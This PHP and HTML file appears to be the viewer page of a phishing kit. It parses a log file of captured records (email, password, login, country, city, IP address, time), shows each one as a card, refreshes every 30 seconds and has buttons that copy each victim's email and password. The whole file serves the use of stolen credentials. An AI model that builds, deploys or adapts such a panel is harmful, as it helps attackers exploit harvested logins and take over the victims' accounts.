<?php
// Read the log file
$log_file = 'logs.txt';
$logs = file_get_contents($log_file);

// Split logs by a custom separator (based on your log format)
$log_entries = explode("\n\n", trim($logs));

// Reverse the order of logs so that the latest ones come first
$log_entries = array_reverse($log_entries);

// Function to safely extract the password from each log entry
function extractPassword($log) {
    preg_match('/Password: (.*?)\n/', $log, $matches);
    return isset($matches[1]) ? $matches[1] : '';
}

// Function to safely extract the email from each log entry
function extractEmail($log) {
    preg_match('/Email: (.*?)\n/', $log, $matches);
    return isset($matches[1]) ? $matches[1] : '';
}

// Function to check if a log entry is a duplicate
function isDuplicate($log, $unique_logs) {
    foreach ($unique_logs as $existing_log) {
        if ($existing_log === $log) {
            return true; // Log is a duplicate
        }
    }
    return false; // Log is unique
}

// Array to hold unique logs
$unique_logs = [];
$filtered_log_entries = [];

// Filter out duplicate logs
foreach ($log_entries as $log) {
    if (!isDuplicate($log, $unique_logs)) {
        $unique_logs[] = $log;
        $filtered_log_entries[] = $log;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>--- Logs ---</title>
  <!-- Bootstrap CSS -->
  <meta http-equiv="refresh" content="30">
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <!-- Custom Styles -->
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f1f1f1;
    }
    .container {
      margin-top: 30px;
    }
    .log-entry {
      background-color: #ffffff;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      padding: 20px;
      margin-bottom: 30px;
      transition: transform 0.2s ease-in-out;
    }
    .log-entry:hover {
      transform: translateY(-5px);
    }
    .log-entry h5 {
      color: #333;
      margin-bottom: 20px;
    }
    .log-entry pre {
      background-color: #f8f9fa;
      padding: 15px;
      border-radius: 6px;
      white-space: pre-wrap;
      word-wrap: break-word;ro
    }
    .btn-copy {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 10px 20px;
      cursor: pointer;
      font-size: 16px;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }
    .btn-copy:hover {
      background-color: #0056b3;
    }
    .log-details {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      margin-bottom: 15px;
    }
    .log-details div {
      flex: 1;
      margin-right: 15px;
    }
    .log-details div:last-child {
      margin-right: 0;
    }
    /* Responsive Styles */
    @media (max-width: 768px) {
      .table {
        font-size: 12px;
      }
      .btn-copy {
        font-size: 14px;
        padding: 8px 16px;
      }
      .log-entry h5 {
        font-size: 18px;
      }
      .log-entry pre {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="text-center mb-4 text-primary">User </h1>

    <!-- Display Total Logs Count -->
    <div class="mb-4 text-center">
      <h5>Total Logs: <?php echo count($filtered_log_entries); ?></h5>
    </div>

    <!-- Log Entries -->
    <div class="row">
      <?php if (!empty($filtered_log_entries)): ?>
        <?php $serialNumber = count($filtered_log_entries); ?>
        <?php foreach ($filtered_log_entries as $index => $log): ?>
          <?php
            // Extract the relevant details from each log entry
            $password = extractPassword($log);
            $email = extractEmail($log);
            preg_match('/Login: (.*?)\n/', $log, $loginMatch);
            $login = isset($loginMatch[1]) ? $loginMatch[1] : '';
            preg_match('/Country: (.*?)\n/', $log, $countryMatch);
            $country = isset($countryMatch[1]) ? $countryMatch[1] : '';
            preg_match('/Region: (.*?)\n/', $log, $regionMatch);
            $region = isset($regionMatch[1]) ? $regionMatch[1] : '';
            preg_match('/City: (.*?)\n/', $log, $cityMatch);
            $city = isset($cityMatch[1]) ? $cityMatch[1] : '';
            preg_match('/IP Address: (.*?)\n/', $log, $ipMatch);
            $ip = isset($ipMatch[1]) ? $ipMatch[1] : '';
            preg_match('/Date and Time: (.*?)\n/', $log, $timeMatch);
            $time = isset($timeMatch[1]) ? $timeMatch[1] : '';
          ?>
          <div class="col-md-6 col-lg-4">
            <div class="log-entry">
              <h5 class="text-primary">Log #<?php echo $serialNumber--; ?></h5>
              <div class="log-details">
                <div><strong>Email:</strong> <?php echo $email; ?></div>
                <div><strong>Password:</strong> <?php echo $password; ?></div>
              </div>
              <div class="log-details">
                <div><strong>Login:</strong> <?php echo $login; ?></div>
                <div><strong>Country:</strong> <?php echo $country; ?></div>
              </div>
              <div class="log-details">
                <div><strong>Region:</strong> <?php echo $region; ?></div>
                <div><strong>City:</strong> <?php echo $city; ?></div>
              </div>
              <div class="log-details">
                <div><strong>IP Address:</strong> <?php echo $ip; ?></div>
                <div><strong>Date & Time:</strong> <?php echo $time; ?></div>
              </div>
              <div class="text-center mt-3">
                <!-- Copy Buttons -->
                <button class="btn-copy" onclick="copyEmail('<?php echo $index; ?>')">Copy Email</button>
                <button class="btn-copy" onclick="copyPassword('<?php echo $index; ?>')">Copy Password</button>
              </div>
            </div>
          </div>
        <?php endforeach; ?>
      <?php else: ?>
        <p class="text-center col-12">No logs available.</p>
      <?php endif; ?>
    </div>
  </div>

  <!-- Bootstrap JS and jQuery -->
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.0/dist/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

  <script>
    // Function to copy email to clipboard
    function copyEmail(index) {
      var emailText = document.querySelectorAll('.log-entry')[index].querySelector('strong').nextSibling.nodeValue.trim();
      var textArea = document.createElement("textarea");
      textArea.value = emailText;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);

      // Show copied tooltip
      alert('Email copied to clipboard!');
    }

    // Function to copy password to clipboard
    function copyPassword(index) {
      var passwordText = document.querySelectorAll('.log-entry')[index].querySelectorAll('strong')[1].nextSibling.nodeValue.trim();
      var textArea = document.createElement("textarea");
      textArea.value = passwordText;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);

      // Show copied tooltip
      alert('Password copied to clipboard!');
    }
  </script>
</body>
</html>
